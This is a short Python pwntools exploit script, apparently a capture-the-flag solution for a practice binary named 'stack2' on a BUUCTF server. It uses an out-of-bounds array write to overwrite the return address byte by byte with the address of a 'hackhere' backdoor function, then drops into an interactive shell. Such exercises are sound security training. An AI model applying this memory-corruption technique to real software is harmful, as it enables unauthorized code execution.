from pwn import *

#context.log_level = 'debug'

#p = process('./stack2')
p = remote('node4.buuoj.cn', 27321)
elf = ELF('./stack2')

backdoor = elf.sym['hackhere']

p.sendlineafter(b'you have:', b'1')
p.sendlineafter(b'numbers', b'1')
#gdb.attach(p, 'b *0x80488f2')

for i in range(4):
    p.sendlineafter(b'exit\n', b'3')
    p.sendlineafter(b'change:\n', str(0x84 + i).encode())
    p.sendlineafter(b'number:\n', str(int(p32(backdoor)[i])).encode())


p.sendlineafter(b'exit\n', b'5')

p.interactive()